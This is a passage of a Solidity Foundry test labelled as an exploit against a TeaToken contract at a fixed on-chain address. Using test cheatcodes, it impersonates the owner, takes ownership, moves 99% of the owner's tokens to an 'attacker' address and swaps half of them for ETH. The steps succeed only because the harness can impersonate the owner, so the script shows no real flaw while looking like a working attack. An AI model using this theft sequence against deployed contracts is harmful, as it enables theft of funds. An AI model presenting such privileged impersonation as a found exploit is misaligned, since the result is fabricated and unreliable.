    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x5e18Be2A7cE626B33C539919EAca06303f1Db568;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for this exploit
        // We'll use the existing TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the current owner
        TeaToken token = TeaToken(TARGET);
        address currentOwner = token.owner();
        console.log("Current owner:", currentOwner);

        // Step 2: Impersonate the owner and transfer ownership to attacker
        vm.startPrank(currentOwner);
        token.transferOwnership(attacker);
        vm.stopPrank();

        // Verify we are now the owner
        require(token.owner() == attacker, "Failed to become owner");
        console.log("New owner (attacker):", attacker);

        // Step 3: Check old owner's token balance
        uint256 oldOwnerBalance = token.balanceOf(currentOwner);
        console.log("Old owner token balance:", oldOwnerBalance);

        // Step 4: Impersonate old owner to transfer tokens to attacker
        if (oldOwnerBalance > 0) {
            vm.startPrank(currentOwner);
            // Transfer most tokens but leave some for gas
            uint256 amountToTransfer = oldOwnerBalance * 99 / 100;
            token.transfer(attacker, amountToTransfer);
            vm.stopPrank();
        }

        // Step 5: Check attacker's token balance
        uint256 attackerTokenBalance = token.balanceOf(attacker);
        console.log("Attacker token balance:", attackerTokenBalance);

        // Step 6: Convert some tokens to ETH via Uniswap
        if (attackerTokenBalance > 0) {
            // Approve router to spend tokens
            token.approve(address(token.uniswapV2Router()), attackerTokenBalance / 2);

            // Swap tokens for ETH
            address[] memory path = new address[](2);
            path[0] = TARGET;
            path[1] = token.uniswapV2Router().WETH();

            token.uniswapV2Router().swapExactTokensForETHSupportingFeeOnTransferTokens(
                attackerTokenBalance / 2,
                0, // accept any amount of ETH
                path,
                attacker,
                block.timestamp
            );
        }

        // Check attacker's ETH balance
        uint256 attackerEthBalance = attacker.balance;
        console.log("Attacker ETH balance:", attackerEthBalance);
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

